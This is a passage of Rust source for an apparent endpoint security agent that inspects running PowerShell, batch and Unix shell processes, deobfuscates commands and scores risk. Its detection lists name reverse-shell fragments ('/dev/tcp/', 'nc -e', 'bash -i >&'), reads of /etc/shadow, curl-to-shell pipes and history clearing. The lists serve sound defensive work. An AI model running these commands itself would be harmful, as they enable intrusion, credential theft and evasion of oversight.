            let linux_persistence = [
                ("/etc/cron", "Cron job persistence"),
                ("crontab", "Crontab modification"),
                (".bashrc", "Bashrc persistence"),
                (".profile", "Profile persistence"),
                ("/etc/init.d", "Init script persistence"),
                ("systemctl", "Systemd service"),
            ];

            for (pattern, desc) in linux_persistence {
                if content_lower.contains(pattern) {
                    matches.push(ScriptMatch {
                        rule_name: "linux_persistence".to_string(),
                        category: MatchCategory::Persistence,
                        description: desc.to_string(),
                        confidence: 0.75,
                        matched_content: pattern.to_string(),
                        mitre_tactics: vec!["Persistence".to_string()],
                        mitre_techniques: vec!["T1053.003".to_string()],
                    });
                }
            }
        }

        matches
    }

    /// Attempt to deobfuscate PowerShell content
    pub fn deobfuscate_powershell(content: &str) -> Option<String> {
        let mut result = content.to_string();

        // Remove backtick obfuscation
        result = result.replace('`', "");

        // Try to decode Base64 if found
        if let Some(decoded) = Self::try_decode_base64(&result) {
            result = decoded;
        }

        // Simple string concatenation resolution
        result = Self::resolve_string_concat(&result);

        // Character code resolution
        result = Self::resolve_char_codes(&result);

        if result != content {
            Some(result)
        } else {
            None
        }
    }

    /// Try to decode Base64 content
    fn try_decode_base64(content: &str) -> Option<String> {
        // Look for Base64 patterns
        let b64_pattern = regex::Regex::new(r"[A-Za-z0-9+/=]{50,}").ok()?;

        if let Some(m) = b64_pattern.find(content) {
            let b64_str = m.as_str();

            // Try standard Base64
            if let Ok(decoded) =
                base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64_str)
            {
                // Check if it's UTF-16LE (common for PowerShell)
                if decoded.len() >= 2 {
                    // Try UTF-16LE first (PowerShell default for -EncodedCommand)
                    let utf16: Vec<u16> = decoded
                        .chunks_exact(2)
                        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
                        .collect();
                    if let Ok(s) = String::from_utf16(&utf16) {
                        if s.chars().all(|c| c.is_ascii() || c.is_alphanumeric()) {
                            return Some(s);
                        }
                    }
                }

                // Try UTF-8
                if let Ok(s) = String::from_utf8(decoded) {
                    return Some(s);
                }
            }
        }

        None
    }

    /// Resolve simple string concatenation
    fn resolve_string_concat(content: &str) -> String {
        let mut result = content.to_string();

        // Pattern: 'abc'+'def' or "abc"+"def". The `regex` crate does not
        // support backreferences, so the two quote styles are handled with
        // separate alternation patterns.
        let single_quote_concat = regex::Regex::new(r"'([^']*)'\s*\+\s*'([^']*)'").ok();
        if let Some(re) = single_quote_concat {
            result = re
                .replace_all(&result, |caps: &regex::Captures| {
                    format!("'{}{}'", &caps[1], &caps[2])
                })
                .to_string();
        }
        let double_quote_concat = regex::Regex::new(r#""([^"]*)"\s*\+\s*"([^"]*)""#).ok();
        if let Some(re) = double_quote_concat {
            result = re
                .replace_all(&result, |caps: &regex::Captures| {
                    format!("\"{}{}\"", &caps[1], &caps[2])
                })
                .to_string();
        }

        result
    }

    /// Resolve character codes
    fn resolve_char_codes(content: &str) -> String {
        let mut result = content.to_string();

        // Pattern: [char]65 or [char]0x41
        let char_pattern = regex::Regex::new(r"\[char\]\s*(0x[0-9a-fA-F]+|\d+)").ok();
        if let Some(re) = char_pattern {
            result = re
                .replace_all(&result, |caps: &regex::Captures| {
                    let num_str = &caps[1];
                    let num = if num_str.starts_with("0x") {
                        u32::from_str_radix(&num_str[2..], 16).unwrap_or(0)
                    } else {
                        num_str.parse::<u32>().unwrap_or(0)
                    };
                    if let Some(c) = char::from_u32(num) {
                        format!("'{}'", c)
                    } else {
                        caps[0].to_string()
                    }
                })
                .to_string();
        }

        result
    }

    /// Calculate risk score based on detections
    pub fn calculate_risk_score(matches: &[ScriptMatch]) -> f32 {
        if matches.is_empty() {
            return 0.0;
        }

        let mut score = 0.0;
        let mut category_weights: HashMap<MatchCategory, f32> = HashMap::new();

        // Weight by category
        for m in matches {
            let weight = match m.category {
                MatchCategory::AttackTool => 1.0,
                MatchCategory::AmsiBypass => 0.95,
                MatchCategory::ProcessInjection => 0.95,
                MatchCategory::CredentialAccess => 0.9,
                MatchCategory::DownloadCradle => 0.85,
                MatchCategory::DefenderEvasion => 0.85,
                MatchCategory::Reflection => 0.7,
                MatchCategory::EncodedCommand => 0.65,
                MatchCategory::Persistence => 0.75,
                MatchCategory::Exfiltration => 0.8,
                MatchCategory::Obfuscation => 0.5,
                MatchCategory::Discovery => 0.4,
            };

            // Track highest weight per category
            let current = category_weights.entry(m.category.clone()).or_insert(0.0);
            *current = (*current).max(weight * m.confidence);
        }

        // Sum category scores
        score = category_weights.values().sum::<f32>();

        // Normalize to 0-1 range
        (score / 3.0).min(1.0)
    }
}

// ============================================================================
// Platform-specific implementations
// ============================================================================

#[cfg(target_os = "windows")]
impl ScriptInspector {
    /// Monitor Windows script execution
    async fn monitor_windows_scripts(
        tx: &mpsc::Sender<TelemetryEvent>,
        config: &AgentConfig,
        known_pids: &Arc<tokio::sync::Mutex<HashSet<u32>>>,
    ) -> Result<()> {
        use sysinfo::{ProcessRefreshKind, System};

        let mut system = System::new();
        system.refresh_processes_specifics(ProcessRefreshKind::everything());

        // Script host processes
        let script_hosts = [
            ("powershell.exe", ScriptType::PowerShell),
            ("pwsh.exe", ScriptType::PowerShellCore),
            ("cmd.exe", ScriptType::Batch),
            ("wscript.exe", ScriptType::VBScript),
            ("cscript.exe", ScriptType::VBScript),
            ("mshta.exe", ScriptType::JScript),
        ];

        let mut pids = known_pids.lock().await;

        for (pid, process) in system.processes() {
            let pid_u32 = pid.as_u32();

            // Skip already processed
            if pids.contains(&pid_u32) {
                continue;
            }

            let process_name = process.name().to_lowercase();

            // Find matching script host
            for (host_name, script_type) in &script_hosts {
                if process_name.contains(host_name) {
                    // Get command line
                    let cmdline = process
                        .cmd()
                        .iter()
                        .map(|s| s.to_string())
                        .collect::<Vec<_>>()
                        .join(" ");

                    // Extract script content from command line
                    let content = Self::extract_script_content(&cmdline, script_type);

                    // Analyze script
                    let analysis_matches = if let Some(ref c) = content {
                        Self::analyze_script(c, script_type)
                    } else {
                        Self::analyze_script(&cmdline, script_type)
                    };

                    // Only generate event if suspicious
                    if !analysis_matches.is_empty() {
                        let risk_score = Self::calculate_risk_score(&analysis_matches);

                        // Determine severity
                        let severity = if risk_score >= 0.9 {
                            Severity::Critical
                        } else if risk_score >= 0.7 {
                            Severity::High
                        } else if risk_score >= 0.5 {
                            Severity::Medium
                        } else {
                            Severity::Low
                        };

                        // Try deobfuscation for PowerShell
                        let deobfuscated = if matches!(
                            script_type,
                            ScriptType::PowerShell | ScriptType::PowerShellCore
                        ) {
                            content
                                .as_ref()
                                .and_then(|c| Self::deobfuscate_powershell(c))
                        } else {
                            None
                        };

                        let script_event = ScriptEvent {
                            pid: pid_u32,
                            ppid: process.parent().map(|p| p.as_u32()).unwrap_or(0),
                            process_name: process_name.clone(),
                            process_path: process
                                .exe()
                                .map(|p| p.display().to_string())
                                .unwrap_or_default(),
                            script_type: *script_type,
                            cmdline: cmdline.clone(),
                            content: content.clone(),
                            deobfuscated_content: deobfuscated,
                            script_path: Self::extract_script_path(&cmdline),
                            user: Self::get_process_user(pid_u32),
                            is_elevated: Self::check_elevation(pid_u32),
                            obfuscation_techniques: analysis_matches
                                .iter()
                                .filter(|m| m.category == MatchCategory::Obfuscation)
                                .map(|m| m.description.clone())
                                .collect(),
                            suspicious_patterns: analysis_matches
                                .iter()
                                .map(|m| m.description.clone())
                                .collect(),
                            attack_tools: analysis_matches
                                .iter()
                                .filter(|m| m.category == MatchCategory::AttackTool)
                                .map(|m| m.matched_content.clone())
                                .collect(),
                            risk_score,
                        };

                        // Create telemetry event
                        let mut event = TelemetryEvent::new(
                            EventType::ProcessCreate,
                            severity.clone(),
                            EventPayload::Custom(
                                serde_json::to_value(&script_event).unwrap_or_default(),
                            ),
                        );

                        // Add detections
                        for m in &analysis_matches {
                            event.add_detection(Detection {
                                detection_type: DetectionType::ScriptThreat,
                                rule_name: m.rule_name.clone(),
                                confidence: m.confidence,
                                description: m.description.clone(),
                                mitre_tactics: m.mitre_tactics.clone(),
                                mitre_techniques: m.mitre_techniques.clone(),
                            });
                        }

                        // Add metadata
                        event
                            .metadata
                            .insert("script_type".to_string(), script_type.as_str().to_string());
                        event
                            .metadata
                            .insert("risk_score".to_string(), format!("{:.2}", risk_score));
                        event
                            .metadata
                            .insert("deep_inspection".to_string(), "true".to_string());

                        if let Err(e) = tx.send(event).await {
                            warn!(error = %e, "Failed to send script event");
                        }
                    }

                    pids.insert(pid_u32);
                    break;
                }
            }
        }

        // Clean up terminated processes
        let current_pids: HashSet<u32> = system.processes().keys().map(|p| p.as_u32()).collect();
        pids.retain(|pid| current_pids.contains(pid));

        Ok(())
    }

    /// Extract script content from command line
    fn extract_script_content(cmdline: &str, script_type: &ScriptType) -> Option<String> {
        let cmdline_lower = cmdline.to_lowercase();

        match script_type {
            ScriptType::PowerShell | ScriptType::PowerShellCore => {
                // Check for encoded command
                if cmdline_lower.contains("-enc") || cmdline_lower.contains("-encodedcommand") {
                    // Extract Base64 string after -enc/-e/-encodedcommand
                    let patterns = ["-encodedcommand", "-enc", "-e"];
                    for pattern in patterns {
                        if let Some(idx) = cmdline_lower.find(pattern) {
                            let start = idx + pattern.len();
                            let rest = &cmdline[start..].trim();
                            // Extract Base64 until space or end
                            let b64_end = rest.find(' ').unwrap_or(rest.len());
                            let b64_str = &rest[..b64_end];

                            // Try to decode
                            if let Some(decoded) = Self::try_decode_base64(b64_str) {
                                return Some(decoded);
                            }
                        }
                    }
                }

                // Check for -Command parameter
                if cmdline_lower.contains("-command") || cmdline_lower.contains("-c ") {
                    // Extract command content
                    if let Some(idx) = cmdline_lower.find("-command") {
                        let start = idx + 8; // "-command".len()
                        let content = cmdline[start..].trim();
                        if !content.is_empty() {
                            return Some(content.to_string());
                        }
                    }
                }

                // Check for script block in {}
                if cmdline.contains('{') && cmdline.contains('}') {
                    if let Some(start) = cmdline.find('{') {
                        if let Some(end) = cmdline.rfind('}') {
                            if end > start {
                                return Some(cmdline[start..=end].to_string());
                            }
                        }
                    }
                }

                None
            }
            ScriptType::Batch => {
                // Check for /c parameter
                if cmdline_lower.contains("/c ") {
                    if let Some(idx) = cmdline_lower.find("/c ") {
                        let content = &cmdline[idx + 3..];
                        return Some(content.to_string());
                    }
                }
                None
            }
            ScriptType::VBScript | ScriptType::JScript => {
                // Script file path would be in cmdline
                // Content would need to be read from file
                None
            }
            _ => None,
        }
    }

    /// Extract script file path from command line
    fn extract_script_path(cmdline: &str) -> Option<String> {
        let extensions = [".ps1", ".bat", ".cmd", ".vbs", ".js", ".wsf"];

        for ext in extensions {
            if let Some(idx) = cmdline.to_lowercase().find(ext) {
                // Find the start of the path (either quote or space before)
                let start = cmdline[..idx]
                    .rfind(|c: char| c == '"' || c == '\'' || c == ' ')
                    .map(|i| i + 1)
                    .unwrap_or(0);
                let end = idx + ext.len();

                let path = cmdline[start..end].trim_matches(|c| c == '"' || c == '\'');
                if !path.is_empty() {
                    return Some(path.to_string());
                }
            }
        }

        None
    }

    /// Get process username
    fn get_process_user(pid: u32) -> String {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::Security::{
            GetTokenInformation, LookupAccountSidW, TokenUser, SID_NAME_USE, TOKEN_QUERY,
            TOKEN_USER,
        };
        use windows::Win32::System::Threading::{
            OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION,
        };

        unsafe {
            let process_handle = match OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
                Ok(h) => h,
                Err(_) => return "UNKNOWN".to_string(),
            };

            let mut token_handle = windows::Win32::Foundation::HANDLE::default();
            if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle).is_err() {
                let _ = CloseHandle(process_handle);
                return "UNKNOWN".to_string();
            }

            let _ = CloseHandle(process_handle);

            let mut needed = 0u32;
            let _ = GetTokenInformation(token_handle, TokenUser, None, 0, &mut needed);

            if needed == 0 {
                let _ = CloseHandle(token_handle);
                return "UNKNOWN".to_string();
            }

            let mut buffer = vec![0u8; needed as usize];
            if GetTokenInformation(
                token_handle,
                TokenUser,
                Some(buffer.as_mut_ptr() as *mut _),
                needed,
                &mut needed,
            )
            .is_err()
            {
                let _ = CloseHandle(token_handle);
                return "UNKNOWN".to_string();
            }

            let _ = CloseHandle(token_handle);

            let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);
            let sid = token_user.User.Sid;

            let mut name_buf = vec![0u16; 256];
            let mut domain_buf = vec![0u16; 256];
            let mut name_len = name_buf.len() as u32;
            let mut domain_len = domain_buf.len() as u32;
            let mut sid_type = SID_NAME_USE::default();

            if LookupAccountSidW(
                windows::core::PCWSTR::null(),
                sid,
                windows::core::PWSTR(name_buf.as_mut_ptr()),
                &mut name_len,
                windows::core::PWSTR(domain_buf.as_mut_ptr()),
                &mut domain_len,
                &mut sid_type,
            )
            .is_ok()
            {
                let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
                let domain = String::from_utf16_lossy(&domain_buf[..domain_len as usize]);

                if domain.is_empty() {
                    name
                } else {
                    format!("{}\\{}", domain, name)
                }
            } else {
                "UNKNOWN".to_string()
            }
        }
    }

    /// Check if process is elevated
    fn check_elevation(pid: u32) -> bool {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::Security::{
            GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
        };
        use windows::Win32::System::Threading::{
            OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION,
        };

        unsafe {
            let process_handle = match OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
                Ok(h) => h,
                Err(_) => return false,
            };

            let mut token_handle = windows::Win32::Foundation::HANDLE::default();
            if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle).is_err() {
                let _ = CloseHandle(process_handle);
                return false;
            }

            let _ = CloseHandle(process_handle);

            let mut elevation = TOKEN_ELEVATION::default();
            let mut return_length = 0u32;

            let result = GetTokenInformation(
                token_handle,
                TokenElevation,
                Some(&mut elevation as *mut _ as *mut _),
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut return_length,
            );

            let _ = CloseHandle(token_handle);

            result.is_ok() && elevation.TokenIsElevated != 0
        }
    }
}

#[cfg(target_os = "linux")]
impl ScriptInspector {
    /// Monitor Linux script execution
    async fn monitor_linux_scripts(
        tx: &mpsc::Sender<TelemetryEvent>,
        config: &AgentConfig,
        known_pids: &Arc<tokio::sync::Mutex<HashSet<u32>>>,
    ) -> Result<()> {
        use sysinfo::{ProcessRefreshKind, System};

        let mut system = System::new();
        system.refresh_processes_specifics(ProcessRefreshKind::everything());

        // Script interpreters to monitor
        let script_hosts = [
            ("bash", ScriptType::Bash),
            ("sh", ScriptType::Sh),
            ("zsh", ScriptType::Bash),
            ("python", ScriptType::Python),
            ("python3", ScriptType::Python),
            ("perl", ScriptType::Perl),
            ("ruby", ScriptType::Ruby),
        ];

        let mut pids = known_pids.lock().await;

        for (pid, process) in system.processes() {
            let pid_u32 = pid.as_u32();

            if pids.contains(&pid_u32) {
                continue;
            }

            let process_name = process.name().to_lowercase();

            for (host_name, script_type) in &script_hosts {
                if process_name == *host_name
                    || process_name.starts_with(&format!("{}.", host_name))
                {
                    let cmdline = process
                        .cmd()
                        .iter()
                        .map(|s| s.to_string())
                        .collect::<Vec<_>>()
                        .join(" ");

                    // Skip if just shell without commands
                    if cmdline.trim().is_empty() || cmdline == process_name {
                        continue;
                    }

                    // Linux-specific suspicious patterns
                    let linux_suspicious = Self::analyze_linux_script(&cmdline, script_type);

                    if !linux_suspicious.is_empty() {
                        let risk_score = Self::calculate_risk_score(&linux_suspicious);

                        let severity = if risk_score >= 0.9 {
                            Severity::Critical
                        } else if risk_score >= 0.7 {
                            Severity::High
                        } else if risk_score >= 0.5 {
                            Severity::Medium
                        } else {
                            Severity::Low
                        };

                        let script_event = ScriptEvent {
                            pid: pid_u32,
                            ppid: process.parent().map(|p| p.as_u32()).unwrap_or(0),
                            process_name: process_name.clone(),
                            process_path: process
                                .exe()
                                .map(|p| p.display().to_string())
                                .unwrap_or_default(),
                            script_type: script_type.clone(),
                            cmdline: cmdline.clone(),
                            content: None,
                            deobfuscated_content: None,
                            script_path: Self::extract_linux_script_path(&cmdline),
                            user: Self::get_linux_process_user(pid_u32),
                            is_elevated: Self::check_linux_elevation(pid_u32),
                            obfuscation_techniques: Vec::new(),
                            suspicious_patterns: linux_suspicious
                                .iter()
                                .map(|m| m.description.clone())
                                .collect(),
                            attack_tools: Vec::new(),
                            risk_score,
                        };

                        let mut event = TelemetryEvent::new(
                            EventType::ProcessCreate,
                            severity,
                            EventPayload::Custom(
                                serde_json::to_value(&script_event).unwrap_or_default(),
                            ),
                        );

                        for m in &linux_suspicious {
                            event.add_detection(Detection {
                                detection_type: DetectionType::ScriptThreat,
                                rule_name: m.rule_name.clone(),
                                confidence: m.confidence,
                                description: m.description.clone(),
                                mitre_tactics: m.mitre_tactics.clone(),
                                mitre_techniques: m.mitre_techniques.clone(),
                            });
                        }

                        event
                            .metadata
                            .insert("script_type".to_string(), script_type.as_str().to_string());
                        event
                            .metadata
                            .insert("deep_inspection".to_string(), "true".to_string());

                        if let Err(e) = tx.send(event).await {
                            warn!(error = %e, "Failed to send script event");
                        }
                    }

                    pids.insert(pid_u32);
                    break;
                }
            }
        }

        let current_pids: HashSet<u32> = system.processes().keys().map(|p| p.as_u32()).collect();
        pids.retain(|pid| current_pids.contains(pid));

        Ok(())
    }

    /// Analyze Linux shell scripts
    fn analyze_linux_script(cmdline: &str, script_type: &ScriptType) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let cmdline_lower = cmdline.to_lowercase();

        // Reverse shell patterns
        let reverse_shell_patterns = [
            ("/dev/tcp/", "Bash /dev/tcp reverse shell"),
            ("nc -e", "Netcat reverse shell"),
            ("ncat -e", "Ncat reverse shell"),
            ("bash -i >&", "Interactive bash reverse shell"),
            ("python -c 'import socket", "Python reverse shell"),
            ("perl -e 'use socket", "Perl reverse shell"),
            ("ruby -rsocket", "Ruby reverse shell"),
            ("php -r '$sock=fsockopen", "PHP reverse shell"),
            ("mkfifo", "Named pipe (possible reverse shell)"),
        ];

        for (pattern, desc) in reverse_shell_patterns {
            if cmdline_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "reverse_shell".to_string(),
                    category: MatchCategory::AttackTool,
                    description: desc.to_string(),
                    confidence: 0.95,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Execution".to_string(), "Command and Control".to_string()],
                    mitre_techniques: vec!["T1059.004".to_string(), "T1071".to_string()],
                });
            }
        }

        // Privilege escalation patterns
        let privesc_patterns = [
            ("sudo -l", "Sudo enumeration"),
            ("find / -perm", "SUID/SGID search"),
            ("/etc/passwd", "Password file access"),
            ("/etc/shadow", "Shadow file access"),
            ("cat /etc/sudoers", "Sudoers access"),
            ("getcap", "Linux capabilities enumeration"),
        ];

        for (pattern, desc) in privesc_patterns {
            if cmdline_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "privilege_escalation".to_string(),
                    category: MatchCategory::Discovery,
                    description: desc.to_string(),
                    confidence: 0.7,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec![
                        "Discovery".to_string(),
                        "Privilege Escalation".to_string(),
                    ],
                    mitre_techniques: vec!["T1548".to_string()],
                });
            }
        }

        // Base64 encoding (common for payloads)
        if cmdline_lower.contains("base64 -d") || cmdline_lower.contains("base64 --decode") {
            matches.push(ScriptMatch {
                rule_name: "base64_decode".to_string(),
                category: MatchCategory::EncodedCommand,
                description: "Base64 decoding (possible payload)".to_string(),
                confidence: 0.7,
                matched_content: "base64 decode".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027".to_string()],
            });
        }

        // Curl/wget to shell pipe
        if (cmdline_lower.contains("curl") || cmdline_lower.contains("wget"))
            && (cmdline.contains("| sh")
                || cmdline.contains("| bash")
                || cmdline.contains("|sh")
                || cmdline.contains("|bash"))
        {
            matches.push(ScriptMatch {
                rule_name: "download_execute".to_string(),
                category: MatchCategory::DownloadCradle,
                description: "Download and execute via curl/wget".to_string(),
                confidence: 0.9,
                matched_content: "curl/wget | sh/bash".to_string(),
                mitre_tactics: vec!["Execution".to_string(), "Command and Control".to_string()],
                mitre_techniques: vec!["T1059.004".to_string(), "T1105".to_string()],
            });
        }

        // History clearing
        if cmdline_lower.contains("history -c")
            || cmdline_lower.contains("rm ~/.bash_history")
            || cmdline_lower.contains("> ~/.bash_history")
            || cmdline_lower.contains("unset histfile")
        {
            matches.push(ScriptMatch {
                rule_name: "history_clearing".to_string(),
                category: MatchCategory::DefenderEvasion,
                description: "Command history clearing".to_string(),
                confidence: 0.85,
                matched_content: "history clear".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1070.003".to_string()],
            });
        }

        matches
    }

    /// Extract script path from Linux command
    fn extract_linux_script_path(cmdline: &str) -> Option<String> {
        let extensions = [".sh", ".py", ".pl", ".rb"];

        for ext in extensions {
            if let Some(idx) = cmdline.find(ext) {
                let start = cmdline[..idx]
                    .rfind(|c: char| c.is_whitespace())
                    .map(|i| i + 1)
                    .unwrap_or(0);
                let end = idx + ext.len();

                let path = cmdline[start..end].trim();
                if !path.is_empty() && (path.starts_with('/') || path.starts_with('.')) {
                    return Some(path.to_string());
                }
            }
        }

        None
    }

    /// Get Linux process user
    fn get_linux_process_user(pid: u32) -> String {
        let status_path = format!("/proc/{}/status", pid);

        if let Ok(content) = std::fs::read_to_string(&status_path) {
            for line in content.lines() {
                if line.starts_with("Uid:") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 2 {
                        if let Ok(uid) = parts[1].parse::<u32>() {
                            unsafe {
                                let pwd = libc::getpwuid(uid);
                                if !pwd.is_null() {
                                    let name_ptr = (*pwd).pw_name;
                                    if !name_ptr.is_null() {
                                        if let Ok(name) =
                                            std::ffi::CStr::from_ptr(name_ptr).to_str()
                                        {
                                            return name.to_string();
                                        }
                                    }
                                }
                            }
                            return format!("uid:{}", uid);
                        }
                    }
                }
            }
        }

        "unknown".to_string()
    }

    /// Check if Linux process is elevated
    fn check_linux_elevation(pid: u32) -> bool {
        let status_path = format!("/proc/{}/status", pid);

        if let Ok(content) = std::fs::read_to_string(&status_path) {
            for line in content.lines() {
                if line.starts_with("Uid:") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    // Effective UID is the third field
                    if parts.len() >= 3 {
                        return parts[2] == "0";
                    }
                }
            }
        }

        false
    }
}

#[cfg(target_os = "macos")]
impl ScriptInspector {
    /// Monitor macOS script execution
    async fn monitor_macos_scripts(
        tx: &mpsc::Sender<TelemetryEvent>,
        _config: &AgentConfig,
        known_pids: &Arc<tokio::sync::Mutex<HashSet<u32>>>,
    ) -> Result<()> {
        use sysinfo::{ProcessRefreshKind, System};

        let mut system = System::new();
        system.refresh_processes_specifics(ProcessRefreshKind::everything());

        // Script interpreters to monitor (similar to Linux)
        let script_hosts = [
            ("bash", ScriptType::Bash),
            ("sh", ScriptType::Sh),
            ("zsh", ScriptType::Bash),
            ("python", ScriptType::Python),
            ("python3", ScriptType::Python),
            ("perl", ScriptType::Perl),
            ("ruby", ScriptType::Ruby),
        ];

        let mut pids = known_pids.lock().await;

        for (pid, process) in system.processes() {
            let pid_u32 = pid.as_u32();

            if pids.contains(&pid_u32) {
                continue;
            }

            let process_name = process.name().to_lowercase();

            for (host_name, script_type) in &script_hosts {
                if process_name == *host_name
                    || process_name.starts_with(&format!("{}.", host_name))
                {
                    let cmdline = process
                        .cmd()
                        .iter()
                        .map(|s| s.to_string())
                        .collect::<Vec<_>>()
                        .join(" ");

                    // Skip if just shell without commands
                    if cmdline.trim().is_empty() || cmdline == process_name {
                        continue;
                    }

                    // macOS-specific suspicious patterns
                    let macos_suspicious = Self::analyze_macos_script(&cmdline, script_type);

                    if !macos_suspicious.is_empty() {
                        let risk_score = Self::calculate_risk_score(&macos_suspicious);

                        let severity = if risk_score >= 0.9 {
                            Severity::Critical
                        } else if risk_score >= 0.7 {
                            Severity::High
                        } else if risk_score >= 0.5 {
                            Severity::Medium
                        } else {
                            Severity::Low
                        };

                        let script_event = ScriptEvent {
                            pid: pid_u32,
                            ppid: process.parent().map(|p| p.as_u32()).unwrap_or(0),
                            process_name: process_name.clone(),
                            process_path: process
                                .exe()
                                .map(|p| p.display().to_string())
                                .unwrap_or_default(),
                            script_type: script_type.clone(),
                            cmdline: cmdline.clone(),
                            content: None,
                            deobfuscated_content: None,
                            script_path: Self::extract_macos_script_path(&cmdline),
                            user: Self::get_macos_process_user(pid_u32),
                            is_elevated: Self::check_macos_elevation(pid_u32),
                            obfuscation_techniques: Vec::new(),
                            suspicious_patterns: macos_suspicious
                                .iter()
                                .map(|m| m.description.clone())
                                .collect(),
                            attack_tools: Vec::new(),
                            risk_score,
                        };

                        let mut event = TelemetryEvent::new(
                            EventType::ProcessCreate,
                            severity,
                            EventPayload::Custom(
                                serde_json::to_value(&script_event).unwrap_or_default(),
                            ),
                        );

                        for m in &macos_suspicious {
                            event.add_detection(Detection {
                                detection_type: DetectionType::ScriptThreat,
                                rule_name: m.rule_name.clone(),
                                confidence: m.confidence,
                                description: m.description.clone(),
                                mitre_tactics: m.mitre_tactics.clone(),
                                mitre_techniques: m.mitre_techniques.clone(),
                            });
                        }

                        event
                            .metadata
                            .insert("script_type".to_string(), script_type.as_str().to_string());
                        event
                            .metadata
                            .insert("deep_inspection".to_string(), "true".to_string());

                        if let Err(e) = tx.send(event).await {
                            warn!(error = %e, "Failed to send script event");
                        }
                    }

                    pids.insert(pid_u32);
                    break;
                }
            }
        }

        let current_pids: HashSet<u32> = system.processes().keys().map(|p| p.as_u32()).collect();
        pids.retain(|pid| current_pids.contains(pid));

        Ok(())
    }

    /// Analyze macOS shell scripts (similar to Linux)
    fn analyze_macos_script(cmdline: &str, _script_type: &ScriptType) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let cmdline_lower = cmdline.to_lowercase();

        // Reverse shell patterns
        let reverse_shell_patterns = [
            ("/dev/tcp/", "Bash /dev/tcp reverse shell"),
            ("nc -e", "Netcat reverse shell"),
            ("bash -i >&", "Interactive bash reverse shell"),
            ("python -c 'import socket", "Python reverse shell"),
            ("perl -e 'use socket", "Perl reverse shell"),
            ("ruby -rsocket", "Ruby reverse shell"),
            ("mkfifo", "Named pipe (possible reverse shell)"),
        ];

        for (pattern, desc) in reverse_shell_patterns {
            if cmdline_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "reverse_shell".to_string(),
                    category: MatchCategory::AttackTool,
                    description: desc.to_string(),
                    confidence: 0.95,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Execution".to_string(), "Command and Control".to_string()],
                    mitre_techniques: vec!["T1059.004".to_string(), "T1071".to_string()],
                });
            }
        }

        // Base64 encoding (common for payloads)
        if cmdline_lower.contains("base64 -d") || cmdline_lower.contains("base64 --decode") {
            matches.push(ScriptMatch {
                rule_name: "base64_decode".to_string(),
                category: MatchCategory::EncodedCommand,
                description: "Base64 decoding (possible payload)".to_string(),
                confidence: 0.7,
                matched_content: "base64 decode".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027".to_string()],
            });
        }

        // Curl/wget to shell pipe
        if (cmdline_lower.contains("curl") || cmdline_lower.contains("wget"))
            && (cmdline.contains("| sh")
                || cmdline.contains("| bash")
                || cmdline.contains("|sh")
                || cmdline.contains("|bash"))
        {
            matches.push(ScriptMatch {
                rule_name: "download_execute".to_string(),
                category: MatchCategory::DownloadCradle,
                description: "Download and execute via curl/wget".to_string(),
                confidence: 0.9,
                matched_content: "curl/wget | sh/bash".to_string(),
                mitre_tactics: vec!["Execution".to_string(), "Command and Control".to_string()],
                mitre_techniques: vec!["T1059.004".to_string(), "T1105".to_string()],
            });
        }

        // History clearing
        if cmdline_lower.contains("history -c")
            || cmdline_lower.contains("rm ~/.bash_history")
            || cmdline_lower.contains("rm ~/.zsh_history")
            || cmdline_lower.contains("> ~/.bash_history")
            || cmdline_lower.contains("unset histfile")
        {
            matches.push(ScriptMatch {
                rule_name: "history_clearing".to_string(),
                category: MatchCategory::DefenderEvasion,
                description: "Command history clearing".to_string(),
                confidence: 0.85,
                matched_content: "history clear".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1070.003".to_string()],
            });
        }

        matches
    }

    /// Extract script path from macOS command
    fn extract_macos_script_path(cmdline: &str) -> Option<String> {
        let extensions = [".sh", ".py", ".pl", ".rb"];

        for ext in extensions {
            if let Some(idx) = cmdline.find(ext) {
                let start = cmdline[..idx]
                    .rfind(|c: char| c.is_whitespace())
                    .map(|i| i + 1)
                    .unwrap_or(0);
                let end = idx + ext.len();

                let path = cmdline[start..end].trim();
                if !path.is_empty() && (path.starts_with('/') || path.starts_with('.')) {
                    return Some(path.to_string());
                }
            }
        }

        None
    }

    /// Get macOS process user
    fn get_macos_process_user(_pid: u32) -> String {
        // macOS uses BSD-style APIs similar to Linux
        // For simplicity, return unknown - can be expanded with sysctl
        "unknown".to_string()
    }

    /// Check if macOS process is elevated
    fn check_macos_elevation(_pid: u32) -> bool {
        // For simplicity, return false - can be expanded with authorization services
        false
    }
}

impl Drop for ScriptInspector {
    fn drop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_base64_encoded() {
